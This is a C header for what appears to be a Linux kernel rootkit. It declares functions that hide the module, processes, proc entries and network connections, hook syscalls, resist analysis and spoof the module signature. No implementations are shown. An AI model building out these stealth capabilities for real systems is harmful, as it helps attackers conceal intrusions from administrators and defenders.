#ifndef _STEALTH_H
#define _STEALTH_H

#include <linux/miscdevice.h>

void hide_module(void);
void show_module(void);
void hide_device_node(struct miscdevice *misc);
void hide_current_process(void);
void show_current_process(void);
void hide_proc_entry(void);
void show_proc_entry(void);

void hide_network_connections(void);
void show_network_connections(void);

bool install_syscall_hooks(void);
void restore_syscall_hooks(void);

void setup_anti_analysis(void);
void cleanup_anti_analysis(void);

void setup_stealth_timer(void);
void cleanup_stealth_timer(void);

void spoof_module_signature(void);

void enable_stealth_mode(struct miscdevice *misc);
void disable_stealth_mode(void);

#endif